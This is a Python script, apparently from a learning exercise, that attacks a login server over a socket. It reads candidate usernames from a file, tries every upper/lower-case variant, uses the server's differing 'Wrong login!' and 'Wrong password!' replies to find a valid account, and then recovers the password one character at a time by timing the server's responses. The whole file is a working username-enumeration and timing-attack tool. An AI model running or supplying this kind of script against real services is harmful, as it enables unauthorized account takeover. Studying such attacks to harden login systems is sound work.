import sys
import socket
import itertools
import json
import string
from datetime import datetime

sys.setrecursionlimit(10000)

# a recursion function that finds the correct password
# the function is based on a given knowledge that a substring that matches the password from the beginning causes
# a delay in a server response
def char_by_char(login, password):
    # we know the pass is made of ascii_letters and/or digits from module string
    for char in string.ascii_letters + string.digits:
        message = {
            'login': login,
            'password': password + char
        }
        message_json = json.dumps(message)
        message_json_encoded = message_json.encode()
        # we measure delay in server response for a given pass variant
        sent = datetime.now()
        client_socket.send(message_json_encoded)
        response_json_encoded = client_socket.recv(1024)
        received = datetime.now()
        response_json = response_json_encoded.decode()
        response = json.loads(response_json)
        difference = received - sent
        if response['result'] == 'Connection success!':
            print(message_json)
            exit()
        # due to measuring have I found that the value of 2000ms as a breakpoint for the response delay
        if difference.microseconds >= 2000:
            return char_by_char(login, password + char)


# begin of main loop: first input hostname and port from command line e.g. > python hack.py localhost 9090
args = sys.argv

# create a new socket and connect to the server
with socket.socket() as client_socket:
    hostname = args[1]
    port = int(args[2])
    address = (hostname, port)

    client_socket.connect(address)

    # open file with possible logins
    # using itertools.product we create all possible variations of upper and lower letters of the given logins
    with open('logins.txt', 'r', encoding='utf-8') as file:
        for log in file:
            log = log.rstrip('\n')
            login_variants = list(map(''.join, itertools.product(*((char.upper(), char.lower()) for char in log))))
            for variant in login_variants:
                # the server accepts login/pass in a given way as a json string
                message = {
                    'login': variant,
                    'password': ' '
                }
                message_json = json.dumps(message)
                message_json_encoded = message_json.encode()
                client_socket.send(message_json_encoded)
                response_json_encoded = client_socket.recv(1024)
                response_json = response_json_encoded.decode()
                response = json.loads(response_json)
                # if we use a wrong login -> "Wrong login!" will be received as a response
                # if we guess the login, the response will be "Wrong password!"
                if response['result'] == 'Wrong password!':  # found login!
                    # function that finds password
                    char_by_char(variant, '')